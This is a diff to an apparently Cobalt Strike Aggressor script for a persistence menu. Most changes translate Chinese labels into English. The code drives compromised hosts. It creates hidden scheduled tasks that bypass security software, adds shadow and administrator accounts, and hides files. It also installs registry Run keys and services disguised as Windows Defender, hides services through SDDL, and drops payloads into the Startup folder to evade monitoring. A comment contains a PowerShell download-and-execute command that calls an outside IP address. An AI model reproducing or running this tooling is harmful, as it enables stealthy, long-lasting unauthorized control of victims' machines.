@@ -1,11 +1,11 @@
-menu "☆ 权限维持"{
+menu "Persistence"{
     item "SharpSchTask" {
         blog($1, "\c9=========== SharpSchTask ==========");
         $bid = $1['@'];
         $dialog = dialog("SharpSchTask (.NET 2.0)", %(exec => "C:\\Windows\\Temp\\cmd.exe 1",bid => $bid), &SharpSchTask);
-        dialog_description($dialog, "利用 Windows API，工具化创建隐藏的计划任务，同时绕过安全软件的阻断，达到持久控制。");
-        drow_text($dialog, "exec", "参数：");
-        dbutton_action($dialog, "运行");
+        dialog_description($dialog, "Using the Windows API, instrumentalize the creation of hidden scheduled tasks while bypassing security software blocks to achieve persistent control.");
+        drow_text($dialog, "exec", "Parameters：");
+        dbutton_action($dialog, "Run");
         dialog_show($dialog);
     }
 
@@ -17,9 +17,9 @@ menu "☆ 权限维持"{
         blog($1, "\c9=========== SharpShadowUser ==========");
         $bid = $1['@'];
         $dialog = dialog("SharpShadowUser (.NET 2.0)", %(exec => "Shadow Administrator",bid => $bid), &SharpShadowUser);
-        dialog_description($dialog, "Bypass 远程内存加载克隆影子用户");
-        drow_text($dialog, "exec", "参数：");
-        dbutton_action($dialog, "运行");
+        dialog_description($dialog, "Bypass Remote memory loading clone shadow user");
+        drow_text($dialog, "exec", "Parameters：");
+        dbutton_action($dialog, "Run");
         dialog_show($dialog);
     }
 
@@ -29,10 +29,10 @@ menu "☆ 权限维持"{
     }
 	
 	menu "EasyPersistent" {
-		item "设置常用路径" {
+		item "Setting the common path" {
 			local('$bid');
 			foreach $bid ($1){
-				prompt_text("文件路径?", $filePath, {
+				prompt_text("File path?", $filePath, {
 				$filePath = $1;
 				if($filePath eq ""){
 					show_message("FilePath Cleared.");
@@ -43,12 +43,12 @@ menu "☆ 权限维持"{
 				});
 			}
 		}
-		menu "文件控制"{  
-			item "文件属性" {
+		menu "File Control"{  
+			item "File Properties" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("文件属性控制 attrib",%(filePath => $filePath, Action => "属性查看",bid => $bid),lambda({
-						#$1 是dialog对象，所以这里不能用$1接收参数，用$3
+					$Dialog = dialog("File Properties Control attrib",%(filePath => $filePath, Action => "Attribute View",bid => $bid),lambda({
+						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
 						local('$filePath $Action');
 						$filePath = $3['filePath'];
 						$Action = $3['Action'];
@@ -56,95 +56,95 @@ menu "☆ 权限维持"{
 							berror($bid,"Input FilePath.");
 							return;
 						}
-						if($Action eq "隐藏文件"){
+						if($Action eq "Hide files"){
 							blog($bid,, "-------".getnow()."-------");
-							blog($bid,, "隐藏文件: \c4 attrib $filePath +s +h \o"); 
+							blog($bid,, "Hide files: \c4 attrib $filePath +s +h \o"); 
 							bshell($bid,, "attrib \"$filePath\" +s +h");
-						}else if($Action eq "显示文件"){
+						}else if($Action eq "Show files"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "显示文件: \c4 attrib $filePath -s -h \o"); 
+							blog($bid, "Show files: \c4 attrib $filePath -s -h \o"); 
 							bshell($bid, "attrib \"$filePath\" -s -h");
-						}else if($Action eq "属性查看"){
+						}else if($Action eq "Attribute View"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "属性检查: \c4 attrib $filePath\o"); 
+							blog($bid, "Attribute Check: \c4 attrib $filePath\o"); 
 							bshell($bid, "attrib \"$filePath\"");
 						}},$bid => $bid ));
-					dialog_description($Dialog, "使用attrib进行文件属性查看、设置。");
+					dialog_description($Dialog, "Use attrib to view and set File Properties.");
 					drow_text($Dialog, "filePath", "FilePath: ");
-					drow_combobox($Dialog, "Action", "Action: ", @("属性查看","隐藏文件","显示文件"));
-					dbutton_action($Dialog, "执行");
+					drow_combobox($Dialog, "Action", "Action: ", @("Attribute View","Hide files","Show files"));
+					dbutton_action($Dialog, "Execution");
 					dialog_show($Dialog);
 			}}
 			
-			item "文件权限" { 
+			item "File Permissions" { 
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
-					$Dialog = dialog("文件权限控制 Icacls",%(filePath => $filePath, UserName => $user , Action => "",bid => $bid),lambda({
-						#$1 是dialog对象，所以这里不能用$1接收参数，用$3
+					$Dialog = dialog("File PermissionsControl Icacls",%(filePath => $filePath, UserName => $user , Action => "",bid => $bid),lambda({
+						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
 						local('$filePath $Action $user');
 						$filePath = $3['filePath'];
 						$UserName = $3['UserName'];
 						$Action = $3['Action'];
-						if($Action eq "授予权限"){
+						if($Action eq "Grant Permissions"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "授予权限: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /grant $UserName\:F \o");  #User:F - User完全访问权限   takeown.exe C:\Windows\System32\Magnify.exe
+							blog($bid, "Grant Permissions: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /grant $UserName\:F \o");  #User:F - User Full access privileges   takeown.exe C:\Windows\System32\Magnify.exe
 							bshell($bid, "takeown /F \"$filePath\"");
 							bshell($bid, "icacls \"$filePath\" /grant $UserName\:F ");
-						}else if($Action eq "拒绝权限"){
+						}else if($Action eq "Deny permission"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "拒绝权限: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /deny $UserName\:F \o"); 
+							blog($bid, "Deny permission: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /deny $UserName\:F \o"); 
 							bshell($bid, "takeown /F \"$filePath\"");
 							bshell($bid, "icacls \"$filePath\" /deny $UserName\:F");
-						}else if($Action eq "权限检查"){
+						}else if($Action eq "Permission Check"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "权限检查: \c4 icacls \"$filePath\" \o"); 
+							blog($bid, "Permission Check: \c4 icacls \"$filePath\" \o"); 
 							bshell($bid, "icacls \"$filePath\"");
 						}},$bid => $bid ));
-					dialog_description($Dialog, "使用Icacls进行文件权限查看、设置。");
+					dialog_description($Dialog, "Use Icacls for File Permissions viewing, Settings.");
 					drow_text($Dialog, "filePath", "FilePath: ");
 					drow_text($Dialog, "UserName", "UserName:");
-					drow_combobox($Dialog, "Action", "Action: ", @("权限检查","授予权限","拒绝权限"));
+					drow_combobox($Dialog, "Action", "Action: ", @("Permission Check","Grant Permissions","Deny permission"));
 					dbutton_action($Dialog, "Execute");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "文件链接" {
+			item "File Links" {
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
-					$Dialog = dialog("创建文件链接",%(filePath => $filePath, LinkName => "" , Action => "",bid => $bid),lambda({
-						#$1 是dialog对象，所以这里不能用$1接收参数，用$3
+					$Dialog = dialog("Create File Links",%(filePath => $filePath, LinkName => "" , Action => "",bid => $bid),lambda({
+						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
 						local('$filePath $Action $user');
 						$filePath = $3['filePath'];
 						$LinkName = $3['LinkName'];
 						$Action = $3['Action'];
-						if($Action eq "硬链接"){
+						if($Action eq "Hard Link"){
 							blog($bid,, "-------".getnow()."-------");
-							blog($bid,, "硬链接: \c4 mklink /h \"$LinkName\" \"$filePath\" \o");
+							blog($bid,, "Hard Link: \c4 mklink /h \"$LinkName\" \"$filePath\" \o");
 							bshell($bid,, "mklink /h \"$LinkName\" \"$filePath\"");
-						}else if($Action eq "软连接"){
+						}else if($Action eq "Soft Link"){
 							blog($bid, "-------".getnow()."-------");
-							blog($bid, "软连接: \c4 mklink \"$LinkName\" \"$filePath\"\o");
+							blog($bid, "Soft Link: \c4 mklink \"$LinkName\" \"$filePath\"\o");
 							bshell($bid,, "mklink \"$LinkName\" \"$filePath\"");
 						}},$bid => $bid ));
-					dialog_description($Dialog, "mklink C:\\StartUpPath\\run.exe C:\\tmp\\ . 注意:链接的文件名要指定绝对路径");
+					dialog_description($Dialog, "mklink C:\\StartUpPath\\run.exe C:\\tmp\\ . Note: The linked file name should be specified as an absolute path");
 					drow_text($Dialog, "filePath", "FilePath:");
 					drow_text($Dialog, "LinkName", "LinkName: ");
-					drow_combobox($Dialog, "Action", "Action: ", @("硬链接","软连接"));
+					drow_combobox($Dialog, "Action", "Action: ", @("Hard Link","Soft Link"));
 					dbutton_action($Dialog, "Execute");
 					dialog_show($Dialog);
 				}
 			}
 		}
 
-		menu "注册表" {
-			item "添加注册表启动项"{
+		menu "Register Startup item" {
+			item "Add Registration Form startup item"{
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") , KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
-					dialog_description($Dialog, "注册表添加启动项");
+					dialog_description($Dialog, "Registration Form Add a startup item");
 					drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
 					drow_combobox($Dialog, "Arch", "Arch: ", @("x86", "x64"));
 					drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx","Logon Scripts","Winlogon Shell", "Winlogon Userinit"));
@@ -155,7 +155,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "删除注册表启动项"{
+			item "Remove Entry Form startup items"{
 				local('$bid');  
 				foreach $bid ($1){
 					if (!-isadmin $1['@']){
@@ -163,7 +163,7 @@ menu "☆ 权限维持"{
 					}
 					else{
 						$Dialog = dialog("Remove RegAutoRun",%(RegKey => "HKLM", Arch => binfo($bid, "arch") , RegItem => "Run" ,bid => $bid),&RemoveRegAutoRun);
-						dialog_description($Dialog, "删除注册表启动项");
+						dialog_description($Dialog, "Remove Registration Form startup items");
 						drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
 						drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Logon Scripts", "Winlogon Shell","Winlogon Userinit"));
 						drow_text($Dialog, "KeyName", "KeyName: ");
@@ -174,11 +174,11 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "查询注册表启动项"{
+			item "Query startup items"{
 				local('$bid $arch'); 
 				foreach $bid ($1){
 					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => "x64", bid => $bid),&QueryRegAutoRun);
-					dialog_description($Dialog, "查询注册表启动项");
+					dialog_description($Dialog, "Query startup items");
 					drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
 					drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx","Logon Scripts","Winlogon Shell", "Winlogon Userinit"));
 					drow_combobox($Dialog, "Arch", "Arch: ", @("All","x86", "x64"));
@@ -187,7 +187,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "所有注册表启动项"{
+			item "All Registration Form startup items"{
 				local('$bid $arch'); 
 				foreach $bid ($1){
 					blog($bid, "-------".getnow()."-------");
@@ -223,85 +223,86 @@ menu "☆ 权限维持"{
 			}	
 		}
 
-		menu "系统服务" {
-			item "添加服务" {
+		menu "System Services" {
+			item "Add Service" {
 				local('$bid');
 				foreach $bid ($1){
 					$filePath = "C:\\windows\\Temp\\".randomFileName(6).".exe";
-					$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName(6) , displayname => "1_".randomFileName(6) , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "自启动",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName(6).".exe",setsddl => "显示服务", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
-					dialog_description($Dialog, "添加服务,如果是非服务的程序需要使用:cmd /c start xxx 或者 rundll32 xxx.dll;服务程序用来接受SCM的控制,提供了两个服务程序，一个为正常启动的服务用于执行载荷；另一个只会返回失败，用来作为启动失败回调的服务。");
-					drow_text($Dialog, "servicename", "服务名称: ");
-					drow_text($Dialog, "serviceFile", "服务程序: ");
-					drow_file($Dialog, "evilFile", "选择文件: ");
-					drow_text($Dialog, "binpath", "远程路径: ");
-					drow_text($Dialog, "cmdline", "执行命令: ");
-					drow_text($Dialog, "displayname", "显示名称: ");
-					drow_text_big($Dialog, "description", "服务描述: ");
-					drow_combobox($Dialog, "stype", "启动类型: ", @("自启动","延时启动","手动启动","触发器启动", "启动失败回调"));
-					drow_combobox($Dialog, "setsddl", "设置SDDL: ", @("显示服务", "只读服务", "隐藏服务"));
-					drow_combobox($Dialog, "addtype", "添加方式: ", @("sc cmdline","API"));
+					$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName(6) , displayname => "1_".randomFileName(6) , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "Self-start",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName(6).".exe",setsddl => "Display Service", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
+					dialog_description($Dialog, "Add Service,If a non-service program requires the use of:cmd /c start xxx or rundll32 xxx.dll;The service program is used to accept the Control of SCM, providing two service programs, one for the normal start of the service for the Execution load; the other will only return failure, used as a start failure callback service.");
+					drow_text($Dialog, "servicename", "Service Name: ");
+					drow_text($Dialog, "serviceFile", "Service Procedure: ");
+					drow_file($Dialog, "evilFile", "Select file: ");
+					drow_text($Dialog, "binpath", "Remote Path: ");
+					drow_text($Dialog, "cmdline", "Execution Command: ");
+					drow_text($Dialog, "displayname", "Show Name: ");
+					drow_text_big($Dialog, "description", "Service Description: ");
+					drow_combobox($Dialog, "stype", "Startup Type: ", @("Self-start", "Delayed start", "Manual start", "Trigger start", "Start failure callback"));
+					drow_combobox($Dialog, "setsddl", "Set SDDL: ", @("Show Services", "Read-only Services", "Hidden Services"));
+					drow_combobox($Dialog, "addtype", "Add method: ", @("sc cmdline","API"));
 					dbutton_action($Dialog, "ServiceAdd");
 					dialog_show($Dialog);
 				}
 			}
 
-			item "修改服务" {
+			item "Modify Service" {
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Servers Auto Run",%(servicename => "Wdfup", displayname => "Windows Defender Antivirus Update Service", binpath => "$filePath" ,description => "Windows Defender kernel support.",bid => $bid),&ChangeAutoService);
-					dialog_description($Dialog, "sc config 修改服务");
-					drow_text($Dialog, "servicename", "服务名称: ");
-					drow_text($Dialog, "binpath", "文件路径: ");
-					drow_text($Dialog, "displayname", "显示名称: ");
-					drow_text_big($Dialog, "description", "服务描述: ");
+					dialog_description($Dialog, "sc config Modify Service");
+					drow_text($Dialog, "servicename", "Service Name: ");
+					drow_text($Dialog, "binpath", "File path: ");
+					drow_text($Dialog, "displayname", "Show Name: ");
+					drow_text_big($Dialog, "description", "Service Description: ");
 					dbutton_action($Dialog, "ServiceEdit");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "设置SDDL" {
+			item "Settings SDDL" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("Edit Service SDDL",%(servicename => "Wdfup",SDDL => "隐藏",bid => $bid),&HiddenService);
-					dialog_description($Dialog, "设置SDDL(安全描述符)");
-					drow_text($Dialog, "servicename", "服务名称: ");
-					drow_combobox($Dialog, "SDDL", "操作: ", @("隐藏", "显示"));
+					$Dialog = dialog("Edit Service SDDL",%(servicename => "Wdfup",SDDL => "Hide",bid => $bid),&HiddenService);
+					dialog_description($Dialog, "Settings SDDL(Security Descriptor)");
+					drow_text($Dialog, "servicename", "Service Name: ");
+					drow_combobox($Dialog, "SDDL", "Operation: ", @("Hide", "Show"));
 					dbutton_action($Dialog, "SDDL Edit");
 					dialog_show($Dialog);
 				}
 			}
 			
-			#移除注册表, sc 删除
-			item "删除服务" {
+			#Remove Registration Form, sc Delete
+			item "Delete Service" {
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",bid => $bid),&DeleteService);
-					dialog_description($Dialog, "删除服务");
-					drow_text($Dialog, "servicename", "服务名称: ");
+					dialog_description($Dialog, "Delete Service");
+					drow_text($Dialog, "servicename", "Service Name: ");
 					dbutton_action($Dialog, "DeleteService");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "查询服务" {
+			item "Query Service" {
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",type => "all",state => "active",qtype => "query",bid => $bid),&QService);
-					dialog_description($Dialog, "查询服务");
-					drow_text($Dialog, "servicename", "服务名称: ");
-					drow_combobox($Dialog, "type", "服务类型: ", @("driver", "service","userservice","all")); #要枚举的服务的类型(driver, service, userservice, all) 
-					drow_combobox($Dialog, "state", "服务状态: ", @("active","inactive", "all")); #活动的、非活动的、全部
-					drow_combobox($Dialog, "qtype", "查询方式: ", @("query","qc"));
+					dialog_description($Dialog, "Query Service");
+					drow_text($Dialog, "servicename", "Service Name: ");
+					drow_combobox($Dialog, "type", "Service Type: ", @("driver", "service","userservice","all")); #Type of service to be enumerated(driver, service, userservice, all) 
+					drow_combobox($Dialog, "state", "Service Status: ", @("active","inactive", "all")); 
+					#Active, inactive, all
+					drow_combobox($Dialog, "qtype", "Query method: ", @("query","qc"));
 					dbutton_action($Dialog, "QueryService");
 					dialog_show($Dialog);
 				}
 			}
 		}
-		menu "用户操作" {
-			item "查询账户" {
+		menu "User Operation" {
+			item "Check Account" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("查询账户",%(user => "test",localgroups => "Administrators",addtype => "NET", bid => $bid),lambda({
+					$Dialog = dialog("Check Account",%(user => "test",localgroups => "Administrators",addtype => "NET", bid => $bid),lambda({
 						if($3['user'] eq ""){
 							if($3['addtype'] eq "NET" ){
 								blog($3['bid'],"net1 user");
@@ -347,63 +348,63 @@ menu "☆ 权限维持"{
 					
 						
 					}));
-					dialog_description($Dialog, "查询账户（使用API，账户参数为空时根据组查询全部用户；查询指定账户时，组名参数会被忽略）。其他用户提示:administrator,Guest;本地组查询：net localgroup");
-					drow_text($Dialog, "user", "账户名称: ");
-					drow_combobox($Dialog, "localgroups", "选择账户组: ", @("Users","Guests","Administrators","Remote Desktop Users","Remote Management Users","System Managed Accounts Group",)); 
-					drow_combobox($Dialog, "addtype", "查询方式: ", @("NET","BNET","API","REG"));
-					dbutton_action($Dialog, "查询");
+					dialog_description($Dialog, "Check Account (Using the API, the account Parameters is empty according to the group query all Users; query the specified account, the group name Parameters will be ignored). Other User prompt: administrator, Guest; local group query: net localgroup");
+					drow_text($Dialog, "user", "Account Name: ");
+					drow_combobox($Dialog, "localgroups", "Select account group: ", @("Users","Guests","Administrators","Remote Desktop Users","Remote Management Users","System Managed Accounts Group",)); 
+					drow_combobox($Dialog, "addtype", "Query method: ", @("NET","BNET","API","REG"));
+					dbutton_action($Dialog, "Query");
 					dbutton_help($Dialog, "https://www.qq.com");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "添加用户" {
+			item "Add User " {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("添加新用户到组",%(user => "xasda",pass => "test@123",localgroups => "Administrators",comment => "",addtype => "API",bid => $bid),&AdUser);
-					dialog_description($Dialog, "添加用户，密码中不要包含\$，否则容易出bug.");
-					drow_text($Dialog, "user", "账户名称: ");
-					drow_text($Dialog, "pass", "账户密码: ");
-					drow_text($Dialog, "comment", "账户描述: ");
-					drow_combobox($Dialog, "localgroups", "加入的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
-					drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API","SpoofArg"));
+					$Dialog = dialog("Add New User To the group",%(user => "xasda",pass => "test@123",localgroups => "Administrators",comment => "",addtype => "API",bid => $bid),&AdUser);
+					dialog_description($Dialog, "Add User ，Do not include \$ in the password, otherwise it will be easy to bug.");
+					drow_text($Dialog, "user", "Account Name: ");
+					drow_text($Dialog, "pass", "Account Password: ");
+					drow_text($Dialog, "comment", "Account Description: ");
+					drow_combobox($Dialog, "localgroups", "Joined groups: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
+					drow_combobox($Dialog, "addtype", "Add Mode: ", @("NET","API","SpoofArg"));
 					dbutton_action($Dialog, "AdUser");
 					dialog_show($Dialog);
 				}
 			}
 			
 			
-			item "删除用户" {
+			item "Delete User " {
 				local('$bid');
 				foreach $bid ($1){					
 					$Dialog = dialog("User Delete",%(user => "test",type => "NET",bid => $bid),&DeleteUser);
-					dialog_description($Dialog, "用户删除");
-					drow_text($Dialog, "user", "账户名称: ");
-					drow_combobox($Dialog, "type", "执行方式: ", @("NET","API"));
+					dialog_description($Dialog, "User Delete ");
+					drow_text($Dialog, "user", "Account Name: ");
+					drow_combobox($Dialog, "type", "ExecutionMode: ", @("NET","API"));
 					dbutton_action($Dialog, "DeleteUser");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "修改账户" {
+			item "Modify account" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("修改账户",%(user => "Guest",pass => "test@123$",comment => "",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
-					dialog_description($Dialog, "1(enable).激活账户后设置密码并加入组（如果账户不存在会失败,存在的账户描述信息不会被修改）;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
-					drow_text($Dialog, "user", "账户名称: ");
-					drow_text($Dialog, "pass", "账户密码: ");
-					drow_text($Dialog, "comment", "账户描述: ");
-					drow_combobox($Dialog, "localgroups", "操作的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
-					drow_combobox($Dialog, "addtype", "执行方式: ", @("NET","API"));
-					drow_combobox($Dialog, "DoFt", "执行方法: ", @("enable","disabled","removeGroup"));
-					dbutton_action($Dialog, "执行");
+					$Dialog = dialog("Modify account",%(user => "Guest",pass => "test@123$",comment => "",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
+					dialog_description($Dialog, "1(enable). After activating the account Settings password and join the group (if the account does not exist will fail, the existing Account Description information will not be modified); 2(disabled). Remove User group, disable User; 3(remove group). Remove the account from a specific group. Note: Win10 Activate Guest cannot be used directly for login.");
+					drow_text($Dialog, "user", "Account Name: ");
+					drow_text($Dialog, "pass", "Account Password: ");
+					drow_text($Dialog, "comment", "Account Description: ");
+					drow_combobox($Dialog, "localgroups", "Operation group: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
+					drow_combobox($Dialog, "addtype", "ExecutionMode: ", @("NET","API"));
+					drow_combobox($Dialog, "DoFt", "Execution Method: ", @("enable","disabled","removeGroup"));
+					dbutton_action($Dialog, "Execution");
 					dialog_show($Dialog);
 				}
 			}	
 		}
 
-		menu "启动目录" {
-			item "查询启动目录" {
+		menu "Startup directory" {
+			item "Query Startup directory" {
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -424,7 +425,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "写入启动目录" {
+			item "Write to Startup directory" {
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -433,13 +434,13 @@ menu "☆ 权限维持"{
 					}else{
 						$UploadPath = "C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
 					}
-					$Dialog = dialog("启动目录权限维持", %(UploadPath => $UploadPath , RemoteFileName => "360Safe.exe" , PersistentFile => $PersistentFile , bid => $bid ,Type => "上传本地文件"), &StartUp);
-					dialog_description($Dialog, "上传权限维持程序到启动目录,api写入通过对上传文件设置重启后移动来逃避启动目录监控(重启后写入)。");
-					drow_text($Dialog, "UploadPath", "启动目录: ");
-					drow_text($Dialog, "RemoteFileName", "远程文件名: ");
-					drow_file($Dialog, "PersistentFile", "上传文件: ");
-					drow_combobox($Dialog, "Type", "Type: ", @("直接上传", "API重启写入"));
-					dbutton_action($Dialog, "执行");
+					$Dialog = dialog("Startup directory Persistance Maintenance", %(UploadPath => $UploadPath , RemoteFileName => "360Safe.exe" , PersistentFile => $PersistentFile , bid => $bid ,Type => "Upload local file"), &StartUp);
+					dialog_description($Dialog, "Upload permission maintenance program to Startup directory, apiWrite to evade Startup directory monitoring by moving the uploaded file Settings after restart (Write to after restart).");
+					drow_text($Dialog, "UploadPath", "Startup directory: ");
+					drow_text($Dialog, "RemoteFileName", "Remote File Name: ");
+					drow_file($Dialog, "PersistentFile", "File to upload: ");
+					drow_combobox($Dialog, "Type", "Type: ", @("Direct Upload", "APIReboot method"));
+					dbutton_action($Dialog, "Execution");
 					dialog_show($Dialog);
 				}
 			}
@@ -453,38 +454,39 @@ menu "☆ 权限维持"{
 			$RemoteFileName = $3['RemoteFileName'];
 			$PersistentFile = $3['PersistentFile'];
 			if($PersistentFile eq ""){
-				show_error("请选择上传文件!");
+				show_error("Please select Upload file!");
 			}
 			if($RemoteFileName eq ""){
-				show_error("请输入远程文件名!");
+				show_error("Enter the remote file name!");
 			}
 			if($UploadPath eq ""){
-				show_error("请设置启动目录!");
+				show_error("Please Settings Startup directory!");
 			}
-			if($Type eq "直接上传"){
+			if($Type eq "Direct Upload"){
 				blog($bid,"Upload $PersistentFile To $UploadPath");
 				bcd($bid, $UploadPath);
 				bupload_raw($bid, $UploadPath.$RemoteFileName, readb(openf($PersistentFile), -1));
 				sleep(3000);
 				blog($bid,"Done.");
-			}else if($Type eq "API重启写入"){		
+			}else if($Type eq "API Reboot Write to "){		
 				$TempFile = "C:\\Windows\\Temp\\".randomFileName(6).".exe";
 				blog($bid,"Upload $PersistentFile To $TempFile");
 				bupload_raw($bid, $TempFile, readb(openf($PersistentFile), -1));
 				blog($bid,"Sleep 3s");
-				sleep(3000); #暂停3秒
+				sleep(3000); #Pause for 3 seconds
 				blog($bid,"Use API MoveFileEx $TempFile to ".$UploadPath.$RemoteFileName);
 				$Parameter = $TempFile . "|" . $UploadPath.$RemoteFileName;	
-				$Data = pack("I-", 3) .$Parameter; #?  怎么用C++构造函数传递多个参数
+				$Data = pack("I-", 3) .$Parameter; #?  How to use C++ constructors to pass multiple Parameters
 				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/StartUp/reflective_dll.dll"),$Data, "Move File", 5000);
 			}
 		}
-		# https://www.coder.work/article/562756   计划任务命令行中使用单引号。 shell SCHTASKS /Create /TN \Tempaa /TR "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\\\"http://192.168.200.191:8060/a22\\\"))\"" /RU Administrator /SC ONCE /ST 18:16 /RL HIGHEST /F
-		menu "计划任务"{
-			item "查询计划任务" {
+		# https://www.coder.work/article/562756 Use single quotes in the Schedule Task Command line. shell SCHTASKS /Create /TN \Tempaa /TR "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\\\"http://192.168.200.191:8060/a22\\\"))\"" /RU Administrator /SC ONCE /ST 18:16 /RL HIGHEST /F
+		
+		menu "Program tasks"{
+			item "Query Program tasks" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("添加计划任务",%(taskname => "MicrosoftEdgeUpdateTaskMachineCore" , bid => $bid) ,lambda({
+					$Dialog = dialog("Add Program tasks",%(taskname => "MicrosoftEdgeUpdateTaskMachineCore" , bid => $bid) ,lambda({
 						local('$pre');
 						if($3['box'] eq "true" ){
 							$pre =  "schtasks /query /fo LIST /v";
@@ -499,9 +501,9 @@ menu "☆ 权限维持"{
 							bshell($3['bid'], $pre . " /TN " .$3['taskname']);
 						}
 					}));
-					dialog_description($Dialog, "查询计划任务,任务名称留空为查询全部(数据较多)");
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_checkbox($Dialog, "box", "详细数据: ", "详细信息(/v)");
+					dialog_description($Dialog, "QueryProgram tasks,Task name left blank for Query All (more data)");
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_checkbox($Dialog, "box", "Detailed Data: ", "Detailed information(/v)");
 					dbutton_action($Dialog, "Schtasks Query");
 					dialog_show($Dialog);
 				}
@@ -510,7 +512,7 @@ menu "☆ 权限维持"{
 			item "AddCmdLine" {
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
-					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
+					#If it is a system account, the password is ignored and the User has to enter the password. The /RU option is to facilitate the creation of tasks from the administrator to SYSTEM and SYSTEM.
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
 					@AdminUsers = @("Administrator","SYSTEM");
 					
@@ -518,30 +520,30 @@ menu "☆ 权限维持"{
 						$is_admin = 1;
 						$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_".ticks(); 
 						$level = "HIGHEST";
-						warn($user);  # 提醒注意 ,显示在脚本控制台里
+						warn($user);  # Reminder, displayed in the Script Control Desk
 					}else{
-						#非管理员创建计划任务。
-						#普通用户权限无法写入Microsoft任务下。
-						#普通用户无法使用/NP(不储存任何密码。任务以给定用户的身份非交互的方式运行。只有本地资源可用。), /RL HIGHEST
+						#Non-administrators create Program tasks.
+						#Normal User permissions are not available under the Write to Microsoft task.
+						#Normal User cannot use /NP (no password is stored. Only local resources are available.) , /RL HIGHEST
 						$is_admin = 0;
 						$taskname = "\\Explorer\\Public\\temp_".ticks();
 						$level = "LIMITED";
 						warn($user);
 					}
